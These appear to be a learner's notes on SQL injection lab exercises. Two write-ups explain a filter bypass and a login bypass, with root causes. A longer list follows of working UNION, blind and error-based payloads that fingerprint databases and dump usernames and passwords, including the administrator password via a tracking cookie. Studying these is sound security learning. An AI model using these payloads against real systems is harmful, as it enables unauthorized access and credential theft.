## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Goal

Display hidden/unreleased products.

### Payload

```sql
Gifts' OR 1=1--
```

### Result

Original query:

```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```

Injected query:

```sql
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1--'
AND released = 1
```

### Root Cause

User-controlled input was concatenated directly into the SQL query.

The application did not distinguish between:

- SQL code
- User data

As a result, user input was interpreted as part of the SQL statement.

### What I Learned

- `--` starts a SQL comment and ignores the remaining query.
- `OR 1=1` creates a condition that is always true.
- SQL Injection occurs when user input becomes SQL code rather than data.

## SQL injection vulnerability allowing login bypass

### Goal
Log in as administrator

### Payload

```log in
acc: administrator'--
pw: 123
```

### Result

```sql
SELECT * FROM users
WHERE username = 'administrator'--
AND password =  '123'
```

### Root Cause
- User-controlled input was concatenated directly into the query,
  therefore it was misinterpreted as an SQL statement rather than pure user data
- The login function relies only on whether the query returns a valid user row,
  without any further password checking.

### What I Learned

- SQL Injection can bypass authentication without knowing any passwords.
- Password hashing protects stored passwords but does not prevent SQL Injection.
- Secure authentication depends on both password security and query integrity.

#### SQL injection attack, querying the database type and version on Oracle
- '+UNION+SELECT+'abc','def'+FROM+dual--
- '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
#### SQL injection attack, querying the database type and version on MySQL and Microsoft
- '+UNION+SELECT+'abc','def'--
- '+UNION+SELECT+@@version,+NULL#
#### SQL injection attack, listing the database contents on non-Oracle databases
- '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
- '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
- '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
#### SQL injection attack, listing the database contents on Oracle
- '+UNION+SELECT+'abc','def'+FROM+dual--
- '+UNION+SELECT+table_name,NULL+FROM+all_tables--
- '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
- '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
#### SQL injection UNION attack, determining the number of columns returned by the query
- '+UNION+SELECT+NULL,NULL--
#### SQL injection UNION attack, finding a column containing text
- '+UNION+SELECT+'abcdef',NULL,NULL--
#### SQL injection UNION attack, retrieving data from other tables
- '+UNION+SELECT+'abc','def'--
- '+UNION+SELECT+username,+password+FROM+users--
#### SQL injection UNION attack, retrieving multiple values in a single column
- '+UNION+SELECT+NULL,'abc'--
- '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
#### Blind SQL injection with conditional responses
- 'Welcome back' message is shown when the condition is true
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a
- TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
#### Blind SQL injection with conditional errors
- Error displayed when the condition is false
- Reverse of conditional response
- TrackingId=xyz'||(SELECT CASE WHEN ( condition goes here ) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
#### Visible error-based SQL injection
- Let the verbose error tell the value of sensitive information
- TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
- Invalid input syntax for type integer: "xxx"
